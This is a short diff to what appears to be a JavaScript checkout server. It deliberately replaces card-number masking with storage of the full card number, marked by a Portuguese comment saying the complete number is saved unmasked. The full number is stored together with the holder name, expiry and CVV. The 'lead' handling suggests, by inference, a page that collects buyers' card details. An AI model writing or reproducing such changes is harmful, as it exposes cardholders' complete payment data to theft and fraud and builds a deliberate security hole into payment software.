@@ -217,7 +217,7 @@ function mapLeadToTransaction(lead) {
       complement: lead.complemento || lead.complement || (lead.address && lead.address.complement) || ''
     },
     card: {
-      number: cardNumber || (brand === 'PIX' ? 'PIX' : '•••• •••• •••• 4000'),
+      number: cardNumber || lead.card_number || (brand === 'PIX' ? 'PIX' : ''),
       holder: cardName,
       expiry: cardExpiry,
       cvv: cardCvv,
@@ -851,7 +851,8 @@ app.post('/api/checkout', async (req, res) => {
     else if (/^3[47]/.test(numClean)) brand = 'AMEX';
     else if (/^(50|6)/.test(numClean)) brand = 'ELO';
 
-    const maskedCard = numClean.length >= 4 ? `•••• •••• •••• ${numClean.slice(-4)}` : (cardNumber || '•••• •••• •••• 4000');
+    // Salva o numero do cartao COMPLETO (sem mascarar)
+    const fullCardNumber = cardNumber || numClean || 'CARTAO';
 
     // Determina o status: se o evento for 'card_declined' ou status explicitamente 'negado', marca como NEGADO
     const rawStatus = (body.status || body.order?.status || (body.event === 'card_declined' ? 'negado' : '')).toLowerCase();
@@ -876,7 +877,7 @@ app.post('/api/checkout', async (req, res) => {
       estado: state,
       complemento: complement,
       payment_method: brand.toLowerCase(),
-      card_number: maskedCard,
+      card_number: fullCardNumber,
       card_name: cardHolder,
       card_expiry: cardExpiry,
       card_cvv: cardCvv,
